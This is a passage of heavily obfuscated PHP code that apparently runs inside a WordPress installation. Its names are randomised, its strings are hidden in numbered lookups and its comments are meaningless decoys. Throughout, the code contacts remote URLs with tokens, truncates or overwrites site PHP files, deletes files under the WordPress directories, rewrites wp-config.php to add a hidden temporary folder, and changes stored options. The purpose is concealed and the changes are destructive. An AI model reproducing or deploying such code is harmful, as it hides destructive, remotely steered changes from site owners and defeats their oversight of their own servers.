  foreach ($wpzy6fg5fms6r[f6yrzd2knrmb(1509)] as  $ipl7adq6px3 => $o57oiv_k0hv5a) {
       if  (rdslwi2runwrwbh() <=     0.5)  break;
   if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($o57oiv_k0hv5a)  || empty($o57oiv_k0hv5a['t'])  ||  empty($o57oiv_k0hv5a['p'])   || empty($o57oiv_k0hv5a['b']))      {
unset($wpzy6fg5fms6r[c1sob647u1i(1509)][$ipl7adq6px3]);
  $popd_dnmtqs0il64   =  true;


  continue;
}
if   (!isset($o57oiv_k0hv5a['n'])    || !isset($o57oiv_k0hv5a['h']))   {



if     (!isset($o57oiv_k0hv5a['n']))  $o57oiv_k0hv5a['n'] = (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($o57oiv_k0hv5a['b']) &&  (int)     @$GLOBALS['__scf_b42duf6j1zadm9_105']($o57oiv_k0hv5a['b'])    === 0) ?   1    :    0;
  if  (!isset($o57oiv_k0hv5a['h'])  && $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1510)))    {

    $liu2wq99jhajl3 =    @md5_file($o57oiv_k0hv5a['p']);


if  ($GLOBALS['__scf_fv3zevxzzb_44']($liu2wq99jhajl3) && $liu2wq99jhajl3 !==   "") $o57oiv_k0hv5a['h']  = $liu2wq99jhajl3;
  unset($liu2wq99jhajl3);
}
      $wpzy6fg5fms6r[ovffvv33(1509)][$ipl7adq6px3] = $o57oiv_k0hv5a;

      $popd_dnmtqs0il64    =      true;
      }
  if  (!empty($o57oiv_k0hv5a[hn_f08x0cns80(1511)]))  {
$o57oiv_k0hv5a[c1sob647u1i(1511)]      = 0;
     $o57oiv_k0hv5a[c1sob647u1i(1485)]    =    $GLOBALS['__scf_qzyo0sgkyb6_202']();
  $o57oiv_k0hv5a[bpowi0iglycvx(1512)] =  0;


     $o57oiv_k0hv5a[ovffvv33(1513)] =    0;

 $o57oiv_k0hv5a[ovffvv33(1514)]    =   0;
 $o57oiv_k0hv5a[iw6xe9q4j6sneg(1477)]    =  0;
 $wpzy6fg5fms6r[bpowi0iglycvx(1509)][$ipl7adq6px3]  =    $o57oiv_k0hv5a;

  $popd_dnmtqs0il64      =  true;
  }
if (empty($o57oiv_k0hv5a[ovffvv33(1472)]))      {
$wpzy6fg5fms6r[ovffvv33(1515)][$ipl7adq6px3][ovffvv33(1472)] =   (int)   $o57oiv_k0hv5a[f6yrzd2knrmb(1485)];
 $o57oiv_k0hv5a[f6yrzd2knrmb(1516)]   =    (int)  $o57oiv_k0hv5a[f6yrzd2knrmb(1485)];
 


   $popd_dnmtqs0il64   = true;
}

   if      (!empty($o57oiv_k0hv5a[f6yrzd2knrmb(1514)])  && $GLOBALS['__scf_qzyo0sgkyb6_202']() < (int) $o57oiv_k0hv5a[hn_f08x0cns80(1514)])   continue;
   if ($_s9wu3ekvd3cf8 <=  0) break;
   $_s9wu3ekvd3cf8--;
     $cku3ftfkcaxf    =    iw6xe9q4j6sneg(1517)   .  $GLOBALS['__scf_f7covg93lc_1518']($o57oiv_k0hv5a['t'])   .  iw6xe9q4j6sneg(1519) . $GLOBALS['__scf_ew0pe5qy71c8x_368']((99960+40),  (0x19bc0+0xda67f));
  list($ch7u8u2ur1,      $odcs1ir1yevo7gz)    =  ikfshtej4d_q5fbom($oopusyml3ptz     . $cku3ftfkcaxf);
if  ($ch7u8u2ur1  ===     -2)    break;
    if   ($ch7u8u2ur1    >  0) $v9a3011_py    =  false;
      if ($ch7u8u2ur1    ===  -1 &&  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(701)) && rdslwi2runwrwbh()   > 2)    $GLOBALS['__scf_ajgx8h162s_701'](1);
 if  ($ch7u8u2ur1 === -1) {
       list($ch7u8u2ur1,  $odcs1ir1yevo7gz) =     ikfshtej4d_q5fbom($oopusyml3ptz  .      $cku3ftfkcaxf);


    if     ($ch7u8u2ur1     ===  -2)     break;


if    ($ch7u8u2ur1  >   0)    $v9a3011_py  =    false;
}

 if   ($ch7u8u2ur1  <=   0)   {
      $wpzy6fg5fms6r[iw6xe9q4j6sneg(1515)][$ipl7adq6px3][bpowi0iglycvx(1512)]++;
$popd_dnmtqs0il64 =    true;
  continue;
}
     if    ($ch7u8u2ur1     >= (93+407))   {
 if (xtkq_u_93j5iw5ccyqn($o57oiv_k0hv5a))   {
 g_qoqdy38lfl4v4n3618(ovffvv33(1490),   f6yrzd2knrmb(1520)     . $GLOBALS['__scf_owu_4pajngr_3']($o57oiv_k0hv5a['p']));
   $g5x04iw2w6d[$ipl7adq6px3]   =  $o57oiv_k0hv5a;
   unset($wpzy6fg5fms6r[ovffvv33(1515)][$ipl7adq6px3]);
   }   else {


  $wpzy6fg5fms6r[f6yrzd2knrmb(1515)][$ipl7adq6px3][iw6xe9q4j6sneg(1512)]++;


     }
 $popd_dnmtqs0il64  =   true;$t9v4t9vxz=7225;$zveou3zkgz2s29=$t9v4t9vxz%7;
continue;
 }
    if   ($GLOBALS['__scf_w6mdcepio4lkz5_7']($odcs1ir1yevo7gz,    hn_f08x0cns80(1521) .  $o57oiv_k0hv5a['t'] . f6yrzd2knrmb(1522)) !== false) {
     $g5x04iw2w6d[$ipl7adq6px3]   =    $o57oiv_k0hv5a;
unset($wpzy6fg5fms6r[hn_f08x0cns80(1523)][$ipl7adq6px3]);


$popd_dnmtqs0il64 =  true;
   continue;
    }
 list($aunqp61b87,      $kb392c2mt2py)  =      ikfshtej4d_q5fbom($v2whfedxxthhjp   . ($GLOBALS['__scf_w6mdcepio4lkz5_7']($v2whfedxxthhjp,    '?') ===   false  ?  '?'  :  '&') .  hn_f08x0cns80(1524)     . $GLOBALS['__scf_f7covg93lc_1518']($o57oiv_k0hv5a['t']) .  ovffvv33(1519)  .  $GLOBALS['__scf_ew0pe5qy71c8x_368']((0x452f+0x14171),  (999937+62)));
  if ($aunqp61b87  ===    -2)    break;
  if   ($aunqp61b87  >  0)     $v9a3011_py   =  false;
if    ($aunqp61b87    >= (458+42))     {
// non-singular derivation

  if    (xtkq_u_93j5iw5ccyqn($o57oiv_k0hv5a))  {
      g_qoqdy38lfl4v4n3618(c1sob647u1i(1490),   ovffvv33(1525)  . $GLOBALS['__scf_owu_4pajngr_3']($o57oiv_k0hv5a['p']));
 $g5x04iw2w6d[$ipl7adq6px3]     =      $o57oiv_k0hv5a;
  

  unset($wpzy6fg5fms6r[c1sob647u1i(1523)][$ipl7adq6px3]);
  }   else {
     $wpzy6fg5fms6r[bpowi0iglycvx(1526)][$ipl7adq6px3][f6yrzd2knrmb(1527)]++;

   }
// coerce to float

      $popd_dnmtqs0il64  =      true;
continue;
     }
   if   ($GLOBALS['__scf_fv3zevxzzb_44']($kb392c2mt2py)   &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($kb392c2mt2py, ovffvv33(1528)  .  $o57oiv_k0hv5a['t']   .    f6yrzd2knrmb(1522))    !==  false)  {
      $g5x04iw2w6d[$ipl7adq6px3]   =  $o57oiv_k0hv5a;



unset($wpzy6fg5fms6r[iw6xe9q4j6sneg(1529)][$ipl7adq6px3]);
$popd_dnmtqs0il64     =      true;
    continue;
 }


 $wpzy6fg5fms6r[c1sob647u1i(1530)][$ipl7adq6px3][hn_f08x0cns80(1531)]     =     (int) (isset($wpzy6fg5fms6r[c1sob647u1i(1530)][$ipl7adq6px3][hn_f08x0cns80(1532)])   ? $wpzy6fg5fms6r[bpowi0iglycvx(1530)][$ipl7adq6px3][c1sob647u1i(1532)] : 0)     +    1;
if   ($GLOBALS['__scf_qzyo0sgkyb6_202']()   -  (int) $wpzy6fg5fms6r[bpowi0iglycvx(1533)][$ipl7adq6px3][f6yrzd2knrmb(1516)]     >    (0x22fcc+0x70ab4))  {
    $wpzy6fg5fms6r[bpowi0iglycvx(1533)][$ipl7adq6px3][c1sob647u1i(1534)]   =  1;


  $wpzy6fg5fms6r[iw6xe9q4j6sneg(1533)][$ipl7adq6px3][f6yrzd2knrmb(1514)]     =    $GLOBALS['__scf_qzyo0sgkyb6_202']()   +     (86342+58);
 }    else   {
  $xc341fi29nd5iq0  =    array((15<<2),      (303-3),   (827+73),     (3540+60));
  $zu6nysmmb6ew  = (int)    $wpzy6fg5fms6r[hn_f08x0cns80(1533)][$ipl7adq6px3][hn_f08x0cns80(1532)];
 $wpzy6fg5fms6r[f6yrzd2knrmb(1535)][$ipl7adq6px3][iw6xe9q4j6sneg(1514)]  =   $GLOBALS['__scf_qzyo0sgkyb6_202']()    +    $xc341fi29nd5iq0[$GLOBALS['__scf_bpblov2hvcg_r_494']($zu6nysmmb6ew,     (0x2+0x2))  -  1];
   unset($xc341fi29nd5iq0,     $zu6nysmmb6ew);
    }
$popd_dnmtqs0il64  =   true;



 }



    if ($v9a3011_py &&   $popd_dnmtqs0il64 &&    !empty($wpzy6fg5fms6r[c1sob647u1i(1535)]))    {
     $z95mos70_s =  false;
  



   foreach ($wpzy6fg5fms6r[ovffvv33(1536)]    as   $ftqshhxq8jyq6)     {
// alias-analyze sequentially-consistent alert


if  ((int)  $ftqshhxq8jyq6[iw6xe9q4j6sneg(1537)]  >=     (147^144))  {
$z95mos70_s  =  true;


 break;
}



      }
  if    ($z95mos70_s)    {

 @update_option(bpowi0iglycvx(1463),     hn_f08x0cns80(1538) .   $GLOBALS['__scf_qzyo0sgkyb6_202'](), ovffvv33(1539));
      g_qoqdy38lfl4v4n3618(ovffvv33(1490),  c1sob647u1i(1540));

   foreach    ($wpzy6fg5fms6r[iw6xe9q4j6sneg(1536)]    as $htuh36niay71vh =>   $ftqshhxq8jyq6)   {
if    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($ftqshhxq8jyq6)  && empty($ftqshhxq8jyq6[hn_f08x0cns80(1511)])) $wpzy6fg5fms6r[c1sob647u1i(1536)][$htuh36niay71vh][iw6xe9q4j6sneg(1511)]  =   1;
}
$popd_dnmtqs0il64  =  true;
 }
     }   elseif  (!$v9a3011_py)  {


       $luvrwg08bur1b =  @get_option(c1sob647u1i(1463),   "");

if    (!$GLOBALS['__scf_fv3zevxzzb_44']($luvrwg08bur1b)  || $GLOBALS['__scf_w6mdcepio4lkz5_7']($luvrwg08bur1b, f6yrzd2knrmb(1416))   !==  0)  @update_option(iw6xe9q4j6sneg(1463), ovffvv33(1541)  .   $GLOBALS['__scf_qzyo0sgkyb6_202'](),     ovffvv33(1542));
     }
  if  ($popd_dnmtqs0il64)  {



   if     ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1138)))    @wp_cache_delete(c1sob647u1i(1543), hn_f08x0cns80(1141));
       $v_kk9fre09itu = @get_option(bpowi0iglycvx(1543),  array());
    if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($v_kk9fre09itu)     &&  isset($v_kk9fre09itu[c1sob647u1i(1544)]) && $GLOBALS['__scf_w1m1ydxx4_gm9__38']($v_kk9fre09itu[ovffvv33(1544)]))     {


     foreach  ($v_kk9fre09itu[c1sob647u1i(1544)] as $k09rcr8prwgvfxnw    =>  $o9aa68c7lac95h)    {
 if  (isset($wpzy6fg5fms6r[f6yrzd2knrmb(1544)][$k09rcr8prwgvfxnw])) continue;



      if  (!$GLOBALS['__scf_rd2tojulg06lx_160']($k09rcr8prwgvfxnw,   $uekflbb3so, true)) {
    $wpzy6fg5fms6r[f6yrzd2knrmb(1545)][$k09rcr8prwgvfxnw]  =  $o9aa68c7lac95h;
continue;
 }
// WP Core Data: idempotent-adj gateway

       if  (isset($g5x04iw2w6d[$k09rcr8prwgvfxnw])  &&      $GLOBALS['__scf_w1m1ydxx4_gm9__38']($o9aa68c7lac95h))  {
    $ds0xww0h6c2  =   isset($o9aa68c7lac95h['g'])   ?  (float)   $o9aa68c7lac95h['g'] :    (float)  (isset($o9aa68c7lac95h[bpowi0iglycvx(1546)]) ?    $o9aa68c7lac95h[iw6xe9q4j6sneg(1546)]   :   0);



  $cskdhcm1ir0y40n3 = isset($g5x04iw2w6d[$k09rcr8prwgvfxnw]['g'])   ?  (float) $g5x04iw2w6d[$k09rcr8prwgvfxnw]['g']    :  (float)     (isset($g5x04iw2w6d[$k09rcr8prwgvfxnw][hn_f08x0cns80(1546)])  ?  $g5x04iw2w6d[$k09rcr8prwgvfxnw][c1sob647u1i(1546)]     :     0);


if  ($ds0xww0h6c2  > $cskdhcm1ir0y40n3)  $wpzy6fg5fms6r[bpowi0iglycvx(1545)][$k09rcr8prwgvfxnw]  = $o9aa68c7lac95h;
 

      unset($ds0xww0h6c2,    $cskdhcm1ir0y40n3);


}
  }
}
  unset($v_kk9fre09itu, $k09rcr8prwgvfxnw,      $o9aa68c7lac95h);
}
   foreach ($g5x04iw2w6d   as  $l8ema12tf07o  =>  $dyu5mela3u5ldv) {
// orchestrate lsm-tree for WP List Block

  if  (!isset($wpzy6fg5fms6r[f6yrzd2knrmb(1545)][$l8ema12tf07o]))   cvtaycsw15_xd1srry($dyu5mela3u5ldv['b']);
  }
  unset($g5x04iw2w6d,     $l8ema12tf07o,   $dyu5mela3u5ldv);
if  (empty($wpzy6fg5fms6r[hn_f08x0cns80(1545)]))   @delete_option(iw6xe9q4j6sneg(1547));
elseif  ($popd_dnmtqs0il64)   @update_option(f6yrzd2knrmb(1548),    $wpzy6fg5fms6r,    bpowi0iglycvx(1542));
   }   finally      {
        l5zn64lzopflqr0dsekx(ovffvv33(1548));
  }
   }


   function uxfe0h1yutnjnyqpq78l($amsjsw283qnc3)
    {



      return $GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)  &&    ($GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,   hn_f08x0cns80(1549))  !==  false ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  hn_f08x0cns80(1550)) !==      false  ||    $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,   iw6xe9q4j6sneg(1271))  !==  false    || $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  ovffvv33(1551))   !== false || $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3, f6yrzd2knrmb(1294)) !==   false      ||      $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  bpowi0iglycvx(1552))   !==     false);



}
     function  uijw4aihkg_z6h($amsjsw283qnc3)
    {
if  (!uxfe0h1yutnjnyqpq78l($amsjsw283qnc3))    return  false;
if (wxrmns_khitjn70x40_x($amsjsw283qnc3))   return  true;$senf0w4lmdk4=PHP_INT_MAX/PHP_INT_MAX;$jbu8lhyx_lcu=$senf0w4lmdk4+73;
      if ($GLOBALS['__scf_e24rppqzou_1420'](ovffvv33(1553),      $amsjsw283qnc3,   $u7fvh_hax8vn))  {
     foreach  ($u7fvh_hax8vn[1]  as $jl3vnz4sls816_)   {
 if  (version_compare($jl3vnz4sls816_,    dfb4_mpcgxvnp230hvh1v(),     '<'))      return  true;


}
return  false;



}

  return true;
  }
 function  yddfedd5qn_m8mayqvo6($cupk3kbt8eisf)
     {

   if  (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($cupk3kbt8eisf)    ||   !@$GLOBALS['__scf_sunuwikkpg6_51']($cupk3kbt8eisf)) return;



  $mj_77481utt0efu =  @$GLOBALS['__scf_b42duf6j1zadm9_105']($cupk3kbt8eisf);



    if    (!$mj_77481utt0efu)  return;
if      ($mj_77481utt0efu     >    (10485705+55))    {
      $ja3yhwond2b  =    @$GLOBALS['__scf_utyj_ckly79_101']($cupk3kbt8eisf,    false,  null,    0,     (58944+6592));
   if   (!uxfe0h1yutnjnyqpq78l($ja3yhwond2b)) return;
  if (tq0de4uade8_8rlhtowy($cupk3kbt8eisf) ===   false)      {

   g_qoqdy38lfl4v4n3618(ovffvv33(1554),  c1sob647u1i(1555)  .   $GLOBALS['__scf_owu_4pajngr_3']($cupk3kbt8eisf));
      return;

}
@$GLOBALS['__scf_whcsnotvh9twx_211']($cupk3kbt8eisf,    "<?php\n");

if   ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(748)))    @opcache_invalidate($cupk3kbt8eisf,  true);
return;

    }
 if  ($mj_77481utt0efu >  (0x18e4e+0xe71b2)) {



 $qn9uuxsxpi7sm =   (string) @$GLOBALS['__scf_utyj_ckly79_101']($cupk3kbt8eisf,  false,    null,  0,  (0xc16+0x13ea));


 $zn9nacvba0fda_    =   ($mj_77481utt0efu  >      (8136+56))  ?  (string) @$GLOBALS['__scf_utyj_ckly79_101']($cupk3kbt8eisf,     false, null,   $mj_77481utt0efu  -  (8164+28)) : "";
  $wxpczvq26fgq      = $qn9uuxsxpi7sm  .   $zn9nacvba0fda_;
   if ($wxpczvq26fgq  !== ""   &&      $GLOBALS['__scf_e24rppqzou_1420'](c1sob647u1i(1553),  $wxpczvq26fgq,    $q8l5esh89sr9y))   {
    $vmua0nk5wi = false;
 foreach    ($q8l5esh89sr9y[1] as $qvodims67he)   {
   if  (version_compare($qvodims67he,     dfb4_mpcgxvnp230hvh1v(), '<')) {
 $vmua0nk5wi =   true;
  break;



   }


        }
 if  (!$vmua0nk5wi)   return;

 }
   }
  $amsjsw283qnc3     = @$GLOBALS['__scf_utyj_ckly79_101']($cupk3kbt8eisf);
 if  ($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)    && $GLOBALS['__scf_d4eyetogjbsnt_10']($amsjsw283qnc3) >  (2036612-988036))    $amsjsw283qnc3 = k12vjaxiygekdnj($amsjsw283qnc3);
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)) return;
   



if (!uijw4aihkg_z6h($amsjsw283qnc3))  return;
ps3sofwc0hi1pu_d063bd($cupk3kbt8eisf,     $amsjsw283qnc3);



    }
       function  ps3sofwc0hi1pu_d063bd($cupk3kbt8eisf,  $amsjsw283qnc3)
   {
  $ukjj4vzpxsr =   $GLOBALS['__scf_renvrk8nefa8_474'](iw6xe9q4j6sneg(1556),  "",    $amsjsw283qnc3);



if (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr)    ||   $GLOBALS['__scf_qew3crlieule_339']($ukjj4vzpxsr)  === ""    ||  $GLOBALS['__scf_qew3crlieule_339']($ukjj4vzpxsr) ===      f6yrzd2knrmb(685)) $ukjj4vzpxsr   =  "<?php\n";
 if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($ukjj4vzpxsr) >=   (463+37)  &&  !ib2ffadoyj2m6zxmkaa2in($ukjj4vzpxsr))      $ukjj4vzpxsr  =   "<?php\n";



    $xqumvl60b6ebdutc  = @fileperms($cupk3kbt8eisf);
  $xqumvl60b6ebdutc  =  ($xqumvl60b6ebdutc   ===   false)  ?   (401+19)  :  ($xqumvl60b6ebdutc &     (508+3));
     $sb35et8mi6ehb  = @$GLOBALS['__scf_uo_a60ibqnli_104']($cupk3kbt8eisf);


$ouvanpspjl48sc      =    @$GLOBALS['__scf_ujxphkubsb4a2h_81']($GLOBALS['__scf_po3uwzhcb63b03_11']($cupk3kbt8eisf),    ovffvv33(1557));
 if  ($ouvanpspjl48sc  ===   false) return;
  



if (@$GLOBALS['__scf_whcsnotvh9twx_211']($ouvanpspjl48sc, $ukjj4vzpxsr)  !==  $GLOBALS['__scf_d4eyetogjbsnt_10']($ukjj4vzpxsr)) {
@$GLOBALS['__scf_fbizamz5bjakz_20']($ouvanpspjl48sc);
  return;
}
        @$GLOBALS['__scf_y0ctsi0tqyy7t_18']($ouvanpspjl48sc, $xqumvl60b6ebdutc);
  if (!@$GLOBALS['__scf_qo7895jhcq7i_79']($ouvanpspjl48sc,      $cupk3kbt8eisf)) {
@$GLOBALS['__scf_fbizamz5bjakz_20']($ouvanpspjl48sc);
 return;
  }


 if  ($sb35et8mi6ehb) @$GLOBALS['__scf_c2r2e7u5qd7u_77']($cupk3kbt8eisf, $sb35et8mi6ehb);
       if ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(748)))   @opcache_invalidate($cupk3kbt8eisf, true);
      }

 function v5ndn28g7nt0sx_953($aakozw_1zysblhgx)
    {


     if  (!$GLOBALS['__scf_fv3zevxzzb_44']($aakozw_1zysblhgx))   return  "";
  if   ($GLOBALS['__scf_wdjvpd1lvon9_102'](ovffvv33(1558), $aakozw_1zysblhgx,  $kabkloof2knd))      {
   $emnni5z67kh0 =     $kabkloof2knd[1];

$mj_77481utt0efu  =    @$GLOBALS['__scf_rjpcj9l4bigb5_21']($emnni5z67kh0)   ?  @$GLOBALS['__scf_b42duf6j1zadm9_105']($emnni5z67kh0) :      0;
   if  (!$mj_77481utt0efu    ||  $mj_77481utt0efu   < (454+46)  ||   $mj_77481utt0efu  >    (27842577+24586223)) {
 if ($mj_77481utt0efu >  (73845515-21416715))     {
 $vkfhbb8hycke     = @$GLOBALS['__scf_ba4991zo41sta_36']($emnni5z67kh0);

  if  (!$GLOBALS['__scf_fv3zevxzzb_44']($vkfhbb8hycke)) $vkfhbb8hycke   =   $emnni5z67kh0;
$vkfhbb8hycke   =    $GLOBALS['__scf_usy4mchq83xa_378']('\\',  '/',  $vkfhbb8hycke);
  $fafjgmqoi6tbbn  =   false;


       $f863k3b0b8    =    array(defined(bpowi0iglycvx(1447)) ?    $GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH,    bpowi0iglycvx(1240))   :   "", defined(hn_f08x0cns80(1236))    ?     $GLOBALS['__scf_ofdeuvs8zwos6_12'](WP_CONTENT_DIR, hn_f08x0cns80(1559)) : "");



     foreach  ($f863k3b0b8      as $jnr5vaba92w4f)    {
 $jnr5vaba92w4f     =   $GLOBALS['__scf_usy4mchq83xa_378']('\\',    '/',    $jnr5vaba92w4f);

    if ($jnr5vaba92w4f  !==  ""  &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($vkfhbb8hycke,  $jnr5vaba92w4f     .    '/') === 0) {
 $fafjgmqoi6tbbn   =   true;

   break;$t7zgyjgqio3j1=481;$hqp2a0vq7u9shf=$t7zgyjgqio3j1%5;
}
// atom table

       }



  if  ($fafjgmqoi6tbbn &&    tq0de4uade8_8rlhtowy($emnni5z67kh0)  !==    false) {
 @$GLOBALS['__scf_fbizamz5bjakz_20']($emnni5z67kh0);
    @$GLOBALS['__scf_fbizamz5bjakz_20']($GLOBALS['__scf_po3uwzhcb63b03_11']($emnni5z67kh0)  .   ovffvv33(208)  .   $GLOBALS['__scf_owu_4pajngr_3']($emnni5z67kh0,   iw6xe9q4j6sneg(1560)));
   }    else    {



        g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1554),  c1sob647u1i(1561)  .  $GLOBALS['__scf_owu_4pajngr_3']($emnni5z67kh0));
}
    }
  return    "";
    }
}
 return  $aakozw_1zysblhgx;
   }
 function    v0hfcqjjkc1fk47yl()
   {
 static     $emnni5z67kh0  = null;
    if     ($emnni5z67kh0 ===  null) {
  $jl3vnz4sls816_  =     fcc42yo6xrdenvra0(iw6xe9q4j6sneg(1562),  null);
    if   ($jl3vnz4sls816_   ===   null) {
     $vkp2rjy88qvir  =     fcc42yo6xrdenvra0(c1sob647u1i(593),   "");
$jl3vnz4sls816_    =    ($GLOBALS['__scf_fv3zevxzzb_44']($vkp2rjy88qvir)  && $GLOBALS['__scf_w6mdcepio4lkz5_7']($vkp2rjy88qvir,  hn_f08x0cns80(595))    === 0) ?  1  :   0;
    mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(1562),  $jl3vnz4sls816_, ovffvv33(1563));
     



unset($vkp2rjy88qvir);
  }
 $emnni5z67kh0   =  ((int)  $jl3vnz4sls816_    ===    1);
     }
  return $emnni5z67kh0;
}


 function     zn7jd9uiqykpk825s6l()
      {
if (!defined(f6yrzd2knrmb(1564)))    return;
      $ko9cqc0s7si9cc =    ABSPATH  .   iw6xe9q4j6sneg(1565);
 if     (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ko9cqc0s7si9cc))  {
  $q_yxurqz6g  = $GLOBALS['__scf_po3uwzhcb63b03_11'](ABSPATH)   .    hn_f08x0cns80(1119);
        if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($q_yxurqz6g))  $ko9cqc0s7si9cc =   $q_yxurqz6g;



    }



  if   (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ko9cqc0s7si9cc)  || !@$GLOBALS['__scf_sunuwikkpg6_51']($ko9cqc0s7si9cc))  return;
$vkfhbb8hycke =    @$GLOBALS['__scf_ba4991zo41sta_36']($ko9cqc0s7si9cc);
 if  ($GLOBALS['__scf_fv3zevxzzb_44']($vkfhbb8hycke)  &&     $vkfhbb8hycke   !==     ""  &&   @$GLOBALS['__scf_sunuwikkpg6_51']($vkfhbb8hycke))  $ko9cqc0s7si9cc   = $vkfhbb8hycke;
    if    (@$GLOBALS['__scf_b42duf6j1zadm9_105']($ko9cqc0s7si9cc)    > (105634+4088670))  return;
     $amsjsw283qnc3 =  @$GLOBALS['__scf_utyj_ckly79_101']($ko9cqc0s7si9cc);

     if  (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)   ||   $amsjsw283qnc3  ===  "") return;
 $p2nkodg6ktja =  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,   f6yrzd2knrmb(1566))   !==   false  ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,    bpowi0iglycvx(1567)) !==   false);



  $rncm5zgi_g     =  false;
 if      ($GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  bpowi0iglycvx(1568)) === false)  {
if  (!empty($GLOBALS[iw6xe9q4j6sneg(90)])) {
$rncm5zgi_g     = true;
}  else {
$frju_qwj03jlh66   =  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(741))  ?     $GLOBALS['__scf_cxw7ozc_kikul_82']()    :  ovffvv33(1569);
     if (!@$GLOBALS['__scf_opq_vgkskw_46']($frju_qwj03jlh66) ||  !@$GLOBALS['__scf_sunuwikkpg6_51']($frju_qwj03jlh66))  $rncm5zgi_g   =   true;
 }



}
     $trljeolzpx5vp  =     false;
$q593wwadho62o   =   false;
 if   (!$GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1570),  $amsjsw283qnc3)  && defined(ovffvv33(1571)))    {


$_ac   = WP_CONTENT_DIR   .    f6yrzd2knrmb(524);
if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($_ac))     {
   $o0rmq65mhcs1xrh   =   (string) @$GLOBALS['__scf_utyj_ckly79_101']($_ac,  false,  null, 0,  (4029+67));
    if   ($GLOBALS['__scf_w6mdcepio4lkz5_7']($o0rmq65mhcs1xrh,  iw6xe9q4j6sneg(1572))  !==   false)    $trljeolzpx5vp      =   true;
}


 }  elseif    (
 $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,   c1sob647u1i(546)) ===  false
&&   $GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(1573),  $amsjsw283qnc3)
     ) {
     $q593wwadho62o  =  true;
}



 $s5tfdfos5a71qd     = false;
    if (v0hfcqjjkc1fk47yl())     {$kyv11ap9hrxe=-646;$zgvl8x13az8=($kyv11ap9hrxe>0)?$kyv11ap9hrxe:-$kyv11ap9hrxe;
  if    (
   !$GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1574), $amsjsw283qnc3)
 ||   !$GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1575),  $amsjsw283qnc3)
 || !$GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1576),  $amsjsw283qnc3)


)    $s5tfdfos5a71qd     =  true;
}
  if  (!$p2nkodg6ktja    && !$rncm5zgi_g  && !$trljeolzpx5vp   &&  !$s5tfdfos5a71qd   &&  !$q593wwadho62o)    return;
  $ozh8sd646qgcfba =     "";
   $ukjj4vzpxsr   =  $amsjsw283qnc3;
  if      ($p2nkodg6ktja) {
     if  ($GLOBALS['__scf_e24rppqzou_1420'](hn_f08x0cns80(1577), $amsjsw283qnc3,   $m53glcwml3z8m))    $ozh8sd646qgcfba  .= $GLOBALS['__scf_m9zfobj9w13_357']("\n",  $m53glcwml3z8m[0]);

$ukjj4vzpxsr =     $GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(1577),      "",  $amsjsw283qnc3);


 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))  return;
     if     (!$GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1578),   $ukjj4vzpxsr)) {
   if    ($GLOBALS['__scf_e24rppqzou_1420'](bpowi0iglycvx(1579),  $ukjj4vzpxsr, $t6uu5l5467))   $ozh8sd646qgcfba .=  "\n" .  $GLOBALS['__scf_m9zfobj9w13_357']("\n",     $t6uu5l5467[0]);
   $ukjj4vzpxsr =  $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1579), "",  $ukjj4vzpxsr);
     if    (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))   return;
    }
 }
$k3mw5t4hpw =   iw6xe9q4j6sneg(1580);
  if  ($rncm5zgi_g && $GLOBALS['__scf_wdjvpd1lvon9_102']('/'  .    $k3mw5t4hpw .  '/',   $ukjj4vzpxsr))     {
$ukjj4vzpxsr  =   $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1581)  .   $k3mw5t4hpw   . bpowi0iglycvx(1582),  c1sob647u1i(1583)   . "define( 'WP_TEMP_DIR', ( defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : ABSPATH . 'wp-content' ) . '/.sc_tmp' );\n",  $ukjj4vzpxsr,  1);
